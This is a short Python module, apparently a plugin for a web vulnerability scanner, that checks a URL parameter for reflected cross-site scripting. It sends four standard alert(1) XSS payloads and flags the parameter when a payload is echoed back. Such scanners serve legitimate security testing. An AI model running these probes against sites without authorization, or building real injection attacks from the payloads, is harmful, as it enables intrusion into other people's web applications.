from utils.requester import send_request

# -----------------------
# 🧠 META
# -----------------------

meta = {
    "name": "Reflected XSS",
    "severity": "High",
    "description": "Detects reflected cross-site scripting vulnerabilities"
}

inputs = ["param"]


# -----------------------
# 🚀 SCAN
# -----------------------

def scan(url, param):
    payloads = [
        "<script>alert(1)</script>",
        "'\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
    ]

    findings = []

    try:
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            response = send_request(test_url)

            # 🔥 detection
            if payload.lower() in response.lower():
                findings.append(payload)

        # -----------------------
        # 📊 RESULT
        # -----------------------

        if findings:
            return {
                "vulnerable": True,
                "result": f"Reflected XSS detected with payloads: {', '.join(findings)}",
                "severity": "High"
            }

        return {
            "vulnerable": False,
            "result": "No reflected XSS detected",
            "severity": "Low"
        }

    except Exception as e:
        return {
            "vulnerable": False,
            "result": f"Error: {str(e)}",
            "severity": "Low"
        }